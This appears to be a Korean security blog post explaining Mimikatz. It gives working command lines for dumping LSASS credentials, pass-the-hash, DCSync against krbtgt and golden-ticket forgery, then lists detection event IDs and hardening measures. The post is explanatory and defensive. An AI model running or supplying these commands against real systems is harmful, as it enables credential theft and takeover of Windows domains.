---
layout: post
title: "Mimikatz를 이용한 자격 증명 탈취 (Credential Dumping)"
date: 2025-09-24
categories: [hacking-tools]
tags: [Mimikatz, Credential Dumping, LSASS, Windows, Hacking Tool]
description: "윈도우 시스템의 메모리에서 비밀번호와 해시를 추출하는 강력한 도구인 Mimikatz 분석"
---

## 1. Mimikatz 개요

**Mimikatz**는 벤자민 델피(Benjamin Delpy)가 개발한 윈도우 보안 도구로, 윈도우 운영체제의 메모리에서 평문 비밀번호, 해시, PIN 코드, 케르베로스 티켓 등을 추출하는 기능을 제공합니다. 본래 보안 연구 목적으로 개발되었으나, 현재는 침투 테스트와 실제 해킹 공격에서 가장 널리 사용되는 도구 중 하나입니다.

---

## 2. 주요 기능 및 원리

Mimikatz는 윈도우의 **LSASS(Local Security Authority Subsystem Service)** 프로세스 메모리에 접근하여 인증 정보를 탈취합니다.

### 2.1. sekurlsa::logonpasswords
가장 대표적인 명령어로, 현재 로그인된 사용자들의 비밀번호(설정에 따라 평문 또는 해시)를 추출합니다.

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

### 2.2. Pass-the-Hash (PtH)
추출한 NTLM 해시를 이용하여 비밀번호를 몰라도 인증을 우회합니다.

```cmd
mimikatz # sekurlsa::pth /user:Administrator /domain:target.local /ntlm:<Hash>
```

### 2.3. DCSync
도메인 컨트롤러를 가장하여 AD 복제 권한으로 해시를 추출합니다.

```cmd
mimikatz # lsadump::dcsync /domain:target.local /user:krbtgt
```

### 2.4. Golden Ticket & Silver Ticket

| 티켓 | 대상 | 유효기간 | 필요 정보 |
|------|------|----------|----------|
| Golden | 전체 도메인 | 10년 | krbtgt 해시 |
| Silver | 특정 서비스 | 30일 | 서비스 계정 해시 |

```cmd
# Golden Ticket 생성
mimikatz # kerberos::golden /user:fakeadmin /domain:target.local /sid:S-1-5-21-... /krbtgt:<Hash> /ptt
```

---

## 3. 실습 및 증거

아래는 침투에 성공한 시스템에서 Mimikatz를 실행하여 메모리에 저장된 자격 증명 정보를 덤프한 결과입니다.

![Mimikatz Credential Dump](/assets/images/att-ck/8.1.2.cre.png)

---

## 4. 탐지 방법

| 탐지 포인트 | 설명 |
|------------|------|
| LSASS 접근 | Sysmon Event ID 10 (ProcessAccess) |
| Mimikatz 실행 | 파일 해시, YARA 룰 |
| DCSync | Event ID 4662 (AD 복제 요청) |

---

## 5. 보안 대책

1.  **LSASS 보호**: LSA 보호 모드 활성화 (Windows 8.1+)
2.  **Credential Guard**: 가상화 기반 보안으로 LSASS 격리
3.  **WDigest 비활성화**: 레지스트리 설정으로 평문 저장 방지
4.  **권한 분리**: 도메인 관리자 계정 최소화
5.  **EDR 솔루션**: 메모리 해킹 시도 실시간 탐지

<hr class="short-rule">
